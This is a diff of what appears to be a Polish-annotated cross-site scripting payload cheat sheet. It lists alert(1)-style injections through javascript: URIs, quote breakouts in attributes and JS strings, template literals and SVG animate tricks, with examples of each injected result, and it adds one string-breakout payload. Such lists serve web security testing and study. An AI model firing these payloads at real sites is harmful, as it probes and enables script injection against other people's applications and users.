@@ -14,7 +14,7 @@ javascript:alert('You are hacked!')
 http://foo?&apos;-alert(1)-&apos;   (Przyklad po wstrzyknieciu [<a id="author" href="http://foo?'-alert(1)-'" onclick="var tracker={track(){}};tracker.track('http://foo?'-alert(1)-'');">asdf</a>])
 ${alert(1)}                         (Przyklad po wstrzyknieciu [var message = `0 search results for '${alert(1)}'`;])
 <svg><a><animate attributeName=href values=javascript:alert(1) /><text x=20 y=20>Click me</text></a>
-
+someString"-alert(1)-"someString
 
 ***********************************************************************************************************************************************************
 [Wstrzykciecie w srodku zmiennej]
